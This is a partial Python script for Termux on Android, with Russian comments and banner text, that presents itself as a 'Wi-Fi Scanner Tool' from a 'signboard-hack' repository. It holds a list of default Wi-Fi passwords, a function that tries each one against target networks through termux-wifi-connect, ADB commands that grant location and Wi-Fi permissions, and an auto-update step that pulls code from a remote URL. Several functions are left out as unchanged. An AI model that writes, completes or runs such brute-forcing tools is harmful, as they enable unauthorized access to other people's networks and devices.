import os
import time
import subprocess
import json
import sys
import hashlib
import requests
import re
from threading import Thread
import getpass
import shutil

# ===== КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ: ПУТИ К BINARY =====
TERMUX_BIN_PATH = "/data/data/com.termux/files/usr/bin"
os.environ["PATH"] = f"{TERMUX_BIN_PATH}:{os.environ['PATH']}"

# ===== ОБНОВЛЕННАЯ КОНФИГУРАЦИЯ =====
TARGET_PREFIXES = [
    # ... ваш список префиксов без изменений ...
]

PASSWORD_LIST = [
    "88888888", "888888eu", "12345678", "87654321",
    "00000000", "11111111", "admin123"
]
SCAN_INTERVAL = 15
PASSWORD = "k33rooxx"
REPO_URL = "https://raw.githubusercontent.com/keerooxx/signboard-hack/main/scanner.py"
VERSION = "1.4"  # Обновленная версия
# ========================

def enable_termux_permissions():
    """Включает необходимые разрешения через ADB"""
    commands = [
        "adb shell pm grant com.termux.api android.permission.ACCESS_WIFI_STATE",
        "adb shell pm grant com.termux.api android.permission.CHANGE_WIFI_STATE",
        "adb shell pm grant com.termux.api android.permission.ACCESS_FINE_LOCATION",
        "adb shell appops set --uid com.termux.api SYSTEM_ALERT_WINDOW allow",
        "adb shell dumpsys deviceidle whitelist +com.termux.api"
    ]
    
    for cmd in commands:
        try:
            subprocess.run(cmd.split(), check=True)
            print(f"[✓] Команда выполнена: {cmd}")
        except Exception as e:
            print(f"[!] Ошибка выполнения {cmd}: {str(e)}")

def check_termux_api_installation():
    """Проверяет наличие Termux:API и при необходимости устанавливает"""
    required_packages = [
        "termux-api", 
        "termux-tools",
        "android-tools"  # Для ADB
    ]
    
    print("[~] Проверка зависимостей Termux...")
    try:
        # Проверяем установленные пакеты
        installed = subprocess.check_output(
            ["pkg", "list-installed"], 
            text=True
        )
        
        # Устанавливаем отсутствующие пакеты
        to_install = [pkg for pkg in required_packages if pkg not in installed]
        
        if to_install:
            print(f"[~] Установка пакетов: {', '.join(to_install)}")
            subprocess.run(
                ["pkg", "install", "-y"] + to_install,
                check=True
            )
            print("[✓] Пакеты успешно установлены")
        else:
            print("[✓] Все зависимости установлены")
            
        # Проверка приложения Termux:API
        if not shutil.which("termux-wifi-connect"):
            print("[!] Termux:API не обнаружен!")
            print("[~] Установите приложение Termux:API из Play Market")
            print("[~] После установки перезапустите скрипт")
            sys.exit(1)
            
    except Exception as e:
        print(f"[!] Ошибка установки зависимостей: {e}")
        sys.exit(1)

def print_banner():
    """Обновленный баннер"""
    print(r"""
 ██ ▄█▀▓█████  ██▀███   ▒█████  ▒██   ██▒
 ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░
▓███▄░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒░░  █   ░
▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒ 
▒██▒ █▄░▒████▒░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒
▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░
░ ░░ ░    ░     ░░   ░ ░ ░ ░ ▒   ░    ░  
░  ░      ░  ░   ░         ░ ░   ░    ░  
    """)
    print(f"Wi-Fi Scanner Tool | by @krx1krx | v{VERSION}")
    print("="*45)

# ... остальные функции без изменений (auto_update, check_password, is_target_network) ...

def try_connect(ssid, password):
    """Попытка подключения через Termux API с улучшенным таймаутом"""
    try:
        # Используем абсолютные пути
        termux_bin = os.path.join(TERMUX_BIN_PATH, "termux-wifi-connect")
        
        result = subprocess.run(
            [termux_bin, "-s", ssid, "-p", password],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=30  # Увеличенный таймаут
        )
        
        if result.returncode == 0:
            print("    [✓] Подключение успешно")
            return True
            
        # Анализ ошибок
        if "Background start not allowed" in result.stderr:
            print("    [!] Ошибка: Запуск из фона запрещен!")
            print("    [!] Решение: Дайте разрешение 'Display over other apps'")
        elif "Location" in result.stderr:
            print("    [!] Ошибка: Включите геолокацию!")
        elif "Permission" in result.stderr:
            print("    [!] Ошибка: Недостаточно разрешений!")
        else:
            print(f"    [!] Ошибка подключения: {result.stderr.strip()}")
            
        return False
    except Exception as e:
        print(f"    [!] Исключение при подключении: {e}")
        return False

# ... остальные функции без изменений (test_password, hack_network, scan_wifi_networks, parse_networks) ...

def main():
    # Добавляем путь Termux в PATH
    os.environ["PATH"] = f"{TERMUX_BIN_PATH}:{os.environ.get('PATH', '')}"
    
    # Проверка и установка зависимостей
    check_termux_api_installation()
    
    # Автообновление (без изменений)
    if "--no-update" not in sys.argv and "--restarted" not in sys.argv:
        if auto_update():
            return

    if "--restarted" not in sys.argv:
        sys.argv.append("--restarted")
    
    print_banner()
    
    # Включаем разрешения ADB
    print("[~] Настройка разрешений Termux:API...")
    enable_termux_permissions()
    
    # ... остальная часть main без изменений ...

if __name__ == "__main__":
    main()
